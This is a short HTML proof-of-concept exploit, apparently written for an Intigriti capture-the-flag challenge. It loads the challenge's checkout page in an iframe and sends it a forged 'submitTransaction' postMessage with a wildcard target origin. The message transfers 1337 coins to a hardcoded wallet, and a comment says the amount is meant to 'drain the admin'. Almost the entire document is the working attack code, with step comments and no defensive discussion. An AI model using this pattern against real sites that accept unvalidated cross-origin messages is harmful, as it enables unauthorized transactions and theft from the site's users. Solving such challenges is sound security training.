<!DOCTYPE html>
<html lang="en">
<head>
    <title>PostMessage Exploit PoC</title>
</head>
<body>
    <h1>"Following the trail of coins..."</h1>
    
    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" width="500" height="500"></iframe>

    <script>
        // Step 2: Wait for the iframe to load
        document.getElementById('target').onload = function() {
            console.log("Iframe loaded, preparing payload...");
            
            var targetFrame = document.getElementById('target').contentWindow;

            // Step 3: Craft the malicious transaction data
            var maliciousPayload = {
                type: 'submitTransaction',
                transaction: {
                    currency: '1337COIN', // You can change to ETH or XMR
                    amount: 1337,    // A high amount to drain the admin
                    toAddress: '10970063d33e32396bb80753a2b902d568' // Put your CTF user's wallet address here
                }
            };

            // Step 4: Send the message! The '*' means we send it to any origin.
            // We use a slight delay to ensure target JS is fully initialized.
            setTimeout(() => {
                targetFrame.postMessage(maliciousPayload, '*');
                console.log("Payload sent!");
            }, 1000); 
        };
    </script>
</body>
</html>
